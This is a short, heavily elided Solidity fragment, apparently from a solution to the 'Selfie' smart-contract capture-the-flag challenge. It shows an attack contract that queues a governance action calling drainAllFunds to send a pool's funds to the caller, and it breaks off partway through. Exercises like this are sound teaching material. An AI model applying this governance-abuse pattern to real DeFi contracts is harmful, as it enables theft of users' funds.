...
contract AttackSelfieContract{
    ...
    constructor(address _gov, address _selfiePool, address _token){
    ...
    function attack() public {
        ...
        actionId = gov.queueAction(
            address(selfiePool), 
            abi.encodeWithSignature("drainAllFunds(address)", address(msg.sender)), 
            0);
    }
    function attackByGov() public {
